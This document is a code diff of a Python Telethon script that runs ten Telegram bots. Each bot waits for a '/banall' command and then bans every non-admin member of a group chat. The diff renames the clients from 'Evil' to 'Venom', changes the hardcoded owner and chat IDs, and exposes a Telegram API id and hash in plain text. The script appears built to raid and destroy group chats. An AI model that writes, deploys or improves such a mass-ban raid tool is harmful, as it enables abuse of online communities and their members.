@@ -20,9 +20,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", None)
 BOT_TOKEN9 = config("BOT_TOKEN9", None)
 BOT_TOKEN10 = config("BOT_TOKEN10", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
-EVILS = [6919199044]
-ALTRONS = [-1001766825642]
-SUDO_USERS.append(6919199044)
+Venom = [6812888267]
+ALTRONS = [-1002110180871]
+SUDO_USERS.append(6812888267)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -37,28 +37,28 @@ RIGHTS = ChatBannedRights(
 )
 
 logging.basicConfig(level=logging.INFO)
-Evil1 = TelegramClient('EVIL1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
-Evil2 = TelegramClient('EVIL2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
-Evil3 = TelegramClient('EVIL3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
-Evil4 = TelegramClient('EVIL4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
-Evil5 = TelegramClient('EVIL5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
-Evil6 = TelegramClient('EVIL6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
-Evil7 = TelegramClient('EVIL7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
-Evil8 = TelegramClient('EVIL8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
-Evil9 = TelegramClient('EVIL9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
-Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)
+Venom1 = TelegramClient('Venom1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
+Venom2 = TelegramClient('Venom2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
+Venom3 = TelegramClient('Venom3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
+Venom4 = TelegramClient('Venom4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
+Venom5 = TelegramClient('Venom5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
+Venom6 = TelegramClient('Venom6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
+Venom7 = TelegramClient('Venom7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
+Venom8 = TelegramClient('Venom8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
+Venom9 = TelegramClient('Venom9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
+Venom10 = TelegramClient('Venom10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)
 
 
-@Evil1.on(events.NewMessage(pattern="^/banall"))
-@Evil2.on(events.NewMessage(pattern="^/banall"))
-@Evil3.on(events.NewMessage(pattern="^/banall"))
-@Evil4.on(events.NewMessage(pattern="^/banall"))
-@Evil5.on(events.NewMessage(pattern="^/banall"))
-@Evil6.on(events.NewMessage(pattern="^/banall"))
-@Evil7.on(events.NewMessage(pattern="^/banall"))
-@Evil8.on(events.NewMessage(pattern="^/banall"))
-@Evil9.on(events.NewMessage(pattern="^/banall"))
-@Evil10.on(events.NewMessage(pattern="^/banall"))
+@Venom1.on(events.NewMessage(pattern="^/banall"))
+@Venom2.on(events.NewMessage(pattern="^/banall"))
+@Venom3.on(events.NewMessage(pattern="^/banall"))
+@Venom4.on(events.NewMessage(pattern="^/banall"))
+@Venom5.on(events.NewMessage(pattern="^/banall"))
+@Venom6.on(events.NewMessage(pattern="^/banall"))
+@Venom7.on(events.NewMessage(pattern="^/banall"))
+@Venom8.on(events.NewMessage(pattern="^/banall"))
+@Venom9.on(events.NewMessage(pattern="^/banall"))
+@Venom10.on(events.NewMessage(pattern="^/banall"))
 async def banall(event):
    if event.sender_id in SUDO_USERS:
         await event.delete()
@@ -71,22 +71,22 @@ async def banall(event):
         async for user in event.client.iter_participants(event.chat_id):
             all += 1
             try:
-                if user.id not in admins_id and user.id not in EVILS:
+                if user.id not in admins_id and user.id not in Venom:
                     await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                     bann += 1
             except Exception as e:
                 pass
 
 
-print("💞 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳 𝑫𝑬𝑷𝑳𝑶𝒀 𝑩𝒀 𝑺𝑻𝑹𝑨𝑵𝑮𝑬𝑹")
+print("ꪜꫀŇ𐍉ꪑ 𝙓 𝐵𝐴𝑁-𝐴𝐿𝐿")
 
-Evil1.run_until_disconnected()
-Evil2.run_until_disconnected()
-Evil3.run_until_disconnected()
-Evil4.run_until_disconnected()
-Evil5.run_until_disconnected()
-Evil6.run_until_disconnected()
-Evil7.run_until_disconnected()
-Evil8.run_until_disconnected()
-Evil9.run_until_disconnected()
-Evil10.run_until_disconnected()
+Venom1.run_until_disconnected()
+Venom2.run_until_disconnected()
+Venom3.run_until_disconnected()
+Venom4.run_until_disconnected()
+Venom5.run_until_disconnected()
+Venom6.run_until_disconnected()
+Venom7.run_until_disconnected()
+Venom8.run_until_disconnected()
+Venom9.run_until_disconnected()
+Venom10.run_until_disconnected()
